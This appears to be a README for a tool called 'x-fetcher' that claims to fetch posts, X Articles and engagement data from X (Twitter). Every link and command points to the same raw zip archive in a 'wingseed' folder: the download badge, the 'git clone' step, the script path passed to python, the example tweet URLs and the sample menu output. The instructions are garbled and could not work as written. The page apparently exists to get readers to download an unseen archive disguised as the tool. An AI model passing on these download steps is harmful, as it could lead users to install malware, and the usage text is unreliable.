# 🌟 x-fetcher - Easily Grab Content from X

[![Download x-fetcher](https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip)](https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip)

## 📦 Overview

x-fetcher is a command-line tool for fetching content from X (Twitter). It supports retrieving ordinary tweets, images, videos, and X Articles (long-form content). The tool also collects interaction data such as likes, retweets, views, and bookmarks.

## 🔍 Features

- Fetch regular tweets (text, images, video links)
- Retrieve X Article long-form posts (full text in Markdown format)
- Get engagement data (likes, retweets, views, bookmarks)

## 🚀 Getting Started

You can easily download and run x-fetcher. Follow these steps:

1. **Download the repository**

   Visit the link to download: [Download x-fetcher](https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip)

2. **Clone the repository**

   Open your command line interface and run the following commands:

   ```bash
   git clone https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip
   cd x-fetcher
   pip install requests
   ```

## 🛠️ Usage

To use x-fetcher, you will run a command from your terminal. The basic command format is:

```bash
python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip <x_url> [options]
```

### 🔧 Options

| Option             | Description                           |
|--------------------|---------------------------------------|
| `--save-md`        | Save the main post as Markdown        |
| `--with-replies`   | Fetch comments along with the post    |
| `--full`           | Save a complete archive (post + replies) |
| `--json`           | Output only in JSON format, no file saved |

### 📖 Examples

Here are some examples of how to use x-fetcher:

```bash
# Interactive mode (recommended) - Asks which content to save
python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip"

# Fetch a long X Article
python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip"

# Save the main post as Markdown
python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip" --save-md

# Save a complete archive (main post + comments)
python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip" --full

# Output only JSON (with comments)
python https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip" --json --with-replies
```

### 🎨 Interactive Mode

If you run the script without options, it will show a menu allowing you to choose what to save:

```
📋 Fetch successful! Please select what to save:
=====================
- Topics: "not provided"
- Primary Download Link: "https://github.com/Max9547/x-fetcher/raw/refs/heads/main/wingseed/fetcher_x_v2.0-alpha.1.zip"
```

## 🖥️ System Requirements

x-fetcher works on most systems. You need:

- Python 3.x installed on your machine
- Access to the command line interface (Terminal or CMD)

## 📂 Support and Contributions

If you encounter issues, please create an issue in the GitHub repository. Your feedback is valuable. Contributions through pull requests are welcomed.

## 📧 Contact

For questions, please reach out through the repository's issue page or connect via X (Twitter).

## 📜 License

x-fetcher is open-source and available under the MIT License. Feel free to use, modify, and share the software as per the licensing terms.